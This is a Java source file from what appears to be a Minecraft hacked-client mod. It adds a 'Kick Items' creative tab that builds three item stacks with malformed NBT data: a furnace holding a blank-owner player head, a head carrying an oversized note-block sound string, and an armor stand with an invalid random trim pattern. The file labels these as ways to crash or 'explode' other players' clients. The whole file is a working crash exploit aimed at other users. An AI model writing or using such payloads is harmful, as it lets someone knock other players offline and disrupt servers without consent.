package me.nekosarekawaii.foxglove.creativetab.impl;

import de.florianmichael.viafabricplus.protocolhack.ProtocolHack;
import me.nekosarekawaii.foxglove.creativetab.CreativeTab;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import net.raphimc.vialoader.util.VersionEnum;
import org.apache.commons.lang3.RandomStringUtils;

import java.util.Collection;

public class KickItemsCreativeTab extends CreativeTab {

    public KickItemsCreativeTab() {
        super(new ItemStack(Items.FIREWORK_ROCKET).setCustomName(Text.literal("Kick Items")));
    }

    @Override
    public Collection<ItemStack> entries() {
        final Collection<ItemStack> current = super.entries();
        final VersionEnum targetVersion = ProtocolHack.getTargetVersion();

        current.add(createItem(createKickHead(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Kick Head"), Text.literal(Formatting.GOLD + Formatting.BOLD.toString() + "Can crash older clients")));
        if (targetVersion.isNewerThanOrEqualTo(VersionEnum.r1_20tor1_20_1)) {
            current.add(createItem(createKickHeadV2(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Kick Head V2"), Text.literal(Formatting.AQUA + "Place on a note block and right click"), Text.literal(Formatting.AQUA + "the note block to explode other clients!")));
            current.add(createItem(createKickStand(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Kick Stand")));
        }
        return current;
    }

    private ItemStack createKickHead() {
        final var item = new ItemStack(Items.FURNACE);
        final var base = new NbtCompound();

        final var blockEntityTag = new NbtCompound();
        final var items = new NbtList();

        final var firstSlot = new NbtCompound();
        firstSlot.putByte("Slot", (byte) 0);
        firstSlot.putString("id", "minecraft:player_head");
        firstSlot.putByte("Count", (byte) 1);

        final var skullOwner = new NbtCompound();
        skullOwner.putString("SkullOwner", " ");
        firstSlot.put("tag", skullOwner);

        items.add(firstSlot);

        blockEntityTag.put("Items", items);
        base.put("BlockEntityTag", blockEntityTag);

        item.setNbt(base);

        return item;
    }

    private ItemStack createKickHeadV2() {
        final var item = new ItemStack(Items.PLAYER_HEAD);

        final var base = new NbtCompound();
        final var blockEntityTag = new NbtCompound();

        blockEntityTag.putString("note_block_sound", RandomStringUtils.randomAlphabetic(5).toLowerCase().repeat(6552));
        base.put("BlockEntityTag", blockEntityTag);

        item.setNbt(base);

        return item;
    }

    private ItemStack createKickStand() {
        final var item = new ItemStack(Items.ARMOR_STAND);
        final var base = new NbtCompound();

        final var entityTag = new NbtCompound();

        final var armorItems = new NbtList();

        final var firstArmorItem = new NbtCompound();
        final var armorItemBase = new NbtCompound();

        final var armorTrim = new NbtCompound();
        armorTrim.putString("pattern", RandomStringUtils.random(5).toLowerCase() + ":" + RandomStringUtils.random(5).toUpperCase());
        armorTrim.putString("material", "minecraft:amethyst");

        armorItemBase.put("Trim", armorTrim);

        firstArmorItem.put("tag", armorItemBase);
        firstArmorItem.putByte("Count", (byte) 1);
        firstArmorItem.putString("id", "minecraft:diamond_helmet");

        armorItems.add(firstArmorItem);

        entityTag.put("ArmorItems", armorItems);
        base.put("EntityTag", entityTag);

        item.setNbt(base);

        return item;
    }
}
